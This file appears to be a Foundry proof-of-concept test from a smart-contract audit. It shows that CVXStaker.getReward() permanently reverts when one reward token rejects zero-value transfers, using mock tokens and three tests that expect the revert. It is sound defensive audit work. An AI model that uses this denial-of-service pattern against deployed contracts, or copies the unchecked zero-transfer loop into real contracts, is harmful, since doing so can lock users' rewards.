// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import {CVXStaker} from "../../src/CVXStaker.sol";
import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin-contracts/token/ERC20/ERC20.sol";
import {ICVXBooster} from "../../src/interfaces/ICVXBooster.sol";

/**
 * @title ExploitTest - PoC for CVXStaker Zero-Value Transfer DoS
 * @notice Demonstrates how getReward() can be blocked by ERC20 tokens that revert on zero-value transfers
 *
 * VULNERABILITY DESCRIPTION:
 * The CVXStaker.getReward() function transfers all reward tokens to the rewardsRecipient without
 * checking if the balance is zero. Some ERC20 tokens (like LEND) revert on zero-value transfers.
 * If any reward token in the rewardTokens array has this behavior, the entire getReward() function
 * will revert, causing a denial of service for reward claiming.
 *
 * ATTACK SCENARIO:
 * 1. CVXStaker is initialized with multiple reward tokens, one of which reverts on zero transfers
 * 2. When getReward() is called, it loops through all reward tokens
 * 3. If any token has zero balance, the safeTransfer() call reverts
 * 4. The entire transaction fails, blocking all reward claiming
 *
 * IMPACT:
 * - Permanent DoS on reward claiming functionality
 * - Rewards cannot be distributed to the recipient
 * - No way to remove tokens from the rewardTokens array (set at construction)
 */

/// @notice Mock ERC20 token that reverts on zero-value transfers (like LEND)
contract RevertOnZeroToken is ERC20 {
    constructor() ERC20("RevertOnZero", "ROZ") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    /// @notice Override transfer to revert on zero amounts
    function transfer(address to, uint256 amount) public override returns (bool) {
        require(amount > 0, "RevertOnZeroToken: zero amount");
        return super.transfer(to, amount);
    }

    /// @notice Override transferFrom to revert on zero amounts
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        require(amount > 0, "RevertOnZeroToken: zero amount");
        return super.transferFrom(from, to, amount);
    }
}

/// @notice Normal ERC20 token for comparison
contract NormalToken is ERC20 {
    constructor() ERC20("Normal", "NRM") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @notice Mock CLP token
contract MockCLPToken is ERC20 {
    constructor() ERC20("CLP", "CLP") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @notice Mock CVX Booster
contract MockCVXBooster is ICVXBooster {
    mapping(uint256 => PoolInfo) private _poolInfo;

    function setPoolInfo(uint256 pid, address lptoken, address rewards) external {
        _poolInfo[pid].lptoken = lptoken;
        _poolInfo[pid].crvRewards = rewards;
        _poolInfo[pid].shutdown = false;
    }

    function poolInfo(uint256 _pid) external view override returns (PoolInfo memory) {
        return _poolInfo[_pid];
    }

    function deposit(uint256, uint256, bool) external override returns (bool) {
        return true;
    }

    function depositAll(uint256, bool) external override returns (bool) {
        return true;
    }

    function withdraw(uint256, uint256) external override returns (bool) {
        return true;
    }

    function withdrawAll(uint256) external override returns (bool) {
        return true;
    }
}

/// @notice Mock Base Reward Pool
contract MockBaseRewardPool {
    IERC20 public rewardToken1;
    IERC20 public rewardToken2;

    constructor(address _token1, address _token2) {
        rewardToken1 = IERC20(_token1);
        rewardToken2 = IERC20(_token2);
    }

    /// @notice Simulates claiming rewards by transferring tokens to the caller
    /// @dev In this test, we'll transfer only token1 to simulate a scenario where token2 has zero balance
    function getReward(address _account, bool) external returns (bool) {
        // Transfer some of token1 (simulating earned rewards)
        uint256 token1Balance = rewardToken1.balanceOf(address(this));
        if (token1Balance > 0) {
            rewardToken1.transfer(_account, token1Balance);
        }

        // Don't transfer token2 - it will have zero balance in the CVXStaker
        // This simulates a scenario where not all reward tokens have been earned

        return true;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function earned(address) external pure returns (uint256) {
        return 0;
    }

    function withdrawAndUnwrap(uint256, bool) external returns (bool) {
        return true;
    }

    function withdrawAllAndUnwrap(bool) external {
        // Do nothing
    }
}

contract ExploitTest is Test {
    CVXStaker public cvxStaker;
    MockCLPToken public clpToken;
    MockCVXBooster public booster;
    MockBaseRewardPool public rewardPool;

    NormalToken public normalRewardToken;
    RevertOnZeroToken public revertOnZeroToken;

    address public owner;
    address public operator;
    address public rewardsRecipient;

    function setUp() public {
        owner = address(this);
        operator = makeAddr("operator");
        rewardsRecipient = makeAddr("rewardsRecipient");

        // Deploy tokens
        clpToken = new MockCLPToken();
        normalRewardToken = new NormalToken();
        revertOnZeroToken = new RevertOnZeroToken();

        // Deploy mock booster
        booster = new MockCVXBooster();

        // Deploy mock reward pool
        rewardPool = new MockBaseRewardPool(
            address(normalRewardToken),
            address(revertOnZeroToken)
        );

        // Setup reward tokens array - includes the problematic token
        address[] memory rewardTokens = new address[](2);
        rewardTokens[0] = address(normalRewardToken);
        rewardTokens[1] = address(revertOnZeroToken); // This token reverts on zero transfers

        // Deploy CVXStaker with both reward tokens
        cvxStaker = new CVXStaker(
            operator,
            IERC20(address(clpToken)),
            booster,
            rewardTokens
        );

        // Configure CVX pool info
        booster.setPoolInfo(0, address(clpToken), address(rewardPool));
        cvxStaker.setCvxPoolInfo(0, address(clpToken), address(rewardPool));

        // Set rewards recipient
        cvxStaker.setRewardsRecipient(rewardsRecipient);

        // Mint some reward tokens to the reward pool
        normalRewardToken.mint(address(rewardPool), 100 ether);
        // Note: We don't mint revertOnZeroToken to the pool, simulating a scenario
        // where this reward hasn't been earned yet
    }

    /**
     * @notice TEST 1: Demonstrates the DoS vulnerability
     * @dev When getReward() is called and one of the reward tokens has zero balance,
     *      the transaction reverts because RevertOnZeroToken reverts on zero transfers
     */
    function test_getReward_RevertsOnZeroBalance() public {
        // STEP 1: Call getReward on the reward pool to transfer rewards to CVXStaker
        // This will transfer normalRewardToken but not revertOnZeroToken
        vm.prank(address(cvxStaker));
        rewardPool.getReward(address(cvxStaker), false);

        // Verify CVXStaker received the normal reward token
        assertEq(normalRewardToken.balanceOf(address(cvxStaker)), 100 ether);

        // Verify CVXStaker has zero balance of the revert-on-zero token
        assertEq(revertOnZeroToken.balanceOf(address(cvxStaker)), 0);

        // STEP 2: Try to call CVXStaker.getReward() to distribute rewards to recipient
        // This should revert because revertOnZeroToken has zero balance and reverts on zero transfers

        // EXPECTED BEHAVIOR: Transaction reverts with "RevertOnZeroToken: zero amount"
        vm.expectRevert("RevertOnZeroToken: zero amount");
        cvxStaker.getReward(false);

        // IMPACT: The rewards recipient cannot receive ANY rewards, even though
        // normalRewardToken has a balance of 100 ether. The entire function is blocked.
    }

    /**
     * @notice TEST 2: Shows that the vulnerability persists even with rewards available
     * @dev Even when legitimate rewards exist, they cannot be claimed due to the zero-balance token
     */
    function test_getReward_BlocksLegitimateRewards() public {
        // Setup: CVXStaker has legitimate rewards in normalRewardToken
        normalRewardToken.mint(address(cvxStaker), 50 ether);

        // Verify initial balances
        assertEq(normalRewardToken.balanceOf(address(cvxStaker)), 50 ether);
        assertEq(normalRewardToken.balanceOf(rewardsRecipient), 0);
        assertEq(revertOnZeroToken.balanceOf(address(cvxStaker)), 0);

        // ATTACK: Try to claim rewards
        // Even though 50 ether of normalRewardToken is available, the transaction reverts
        // because the loop tries to transfer zero revertOnZeroToken
        vm.expectRevert("RevertOnZeroToken: zero amount");
        cvxStaker.getReward(false);

        // IMPACT VERIFICATION: Rewards recipient still has zero balance
        // The 50 ether of legitimate rewards are stuck and cannot be claimed
        assertEq(normalRewardToken.balanceOf(rewardsRecipient), 0);
        assertEq(normalRewardToken.balanceOf(address(cvxStaker)), 50 ether);
    }

    /**
     * @notice TEST 3: Demonstrates that the issue is permanent
     * @dev The rewardTokens array cannot be modified, so the DoS is permanent
     */
    function test_getReward_PermanentDoS() public {
        // Setup: Add rewards over time
        normalRewardToken.mint(address(cvxStaker), 100 ether);

        // First attempt fails
        vm.expectRevert("RevertOnZeroToken: zero amount");
        cvxStaker.getReward(false);

        // Even after time passes and more rewards accumulate, the issue persists
        vm.warp(block.timestamp + 30 days);
        normalRewardToken.mint(address(cvxStaker), 200 ether);

        // Still fails - the DoS is permanent
        vm.expectRevert("RevertOnZeroToken: zero amount");
        cvxStaker.getReward(false);

        // IMPACT: 300 ether of rewards are permanently stuck
        assertEq(normalRewardToken.balanceOf(address(cvxStaker)), 300 ether);
        assertEq(normalRewardToken.balanceOf(rewardsRecipient), 0);

        // NOTE: There is no way to remove revertOnZeroToken from the rewardTokens array
        // The array is set in the constructor and cannot be modified
        // This makes the DoS permanent and unrecoverable
    }
}
